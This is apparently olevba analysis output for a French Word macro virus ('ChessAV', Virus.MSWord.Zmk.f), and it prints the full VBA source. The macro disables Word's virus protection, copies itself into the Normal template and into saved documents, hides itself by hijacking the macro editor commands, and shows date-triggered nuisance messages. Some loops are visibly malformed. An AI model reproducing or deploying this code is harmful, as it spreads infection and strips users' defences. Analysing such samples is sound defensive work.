olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.f-30c860247365e3441e9a24bf6c29ae68cd1c5976
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.f-30c860247365e3441e9a24bf6c29ae68cd1c5976 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ChessAV.bas 
in file: Virus.MSWord.Zmk.f-30c860247365e3441e9a24bf6c29ae68cd1c5976 - OLE stream: 'Macros/VBA/ChessAV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
If D$ = "15" Then
Scroll:
    MsgBox "Attention, Je vais vous ennuyer", vbInformation, "Virus ChessAV"
    ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled + 40
    ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 40
GoTo Scroll
End If
If D$ = "01" Then
Message
    StatusBar = "Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
GoTo Message
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ChessAV" Then
        ChessAVInstalled = -1
    End If
Next i
If Not ChessAVInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ChessAV", Object:=wdOrganizerObjectProjectItems
    MsgBox "Vous n'êtes plus à l'abri des macros virus avec ce format..." & Chr$(13) & "HAHAHAHAHA!!!", vbCritical, "Virus ChessAV"
    MsgBox "ZeMacroKiller98 a trouvé la solution...", vbCritical, "Virus ChessAV"
End If
ErrorFO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatRTF Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ChessAV", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    Selection.EndKey
    Selection.TypeParagraph
    Selection.TypeText Text:="Vive les virus de macro!!!!!"
    Selection.TypeParagraph
    Selection.TypeText Text:="ZeMacroKiller98 est le meilleur!!!!"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
Assistant.Visible = True
    With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Microsoft Word"
    .Text = "Microsoft Visual Basic Editor n'est pas Installé" & Chr$(13) & "Veuillez consulter l'aide en ligne"
    .Show
End With
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
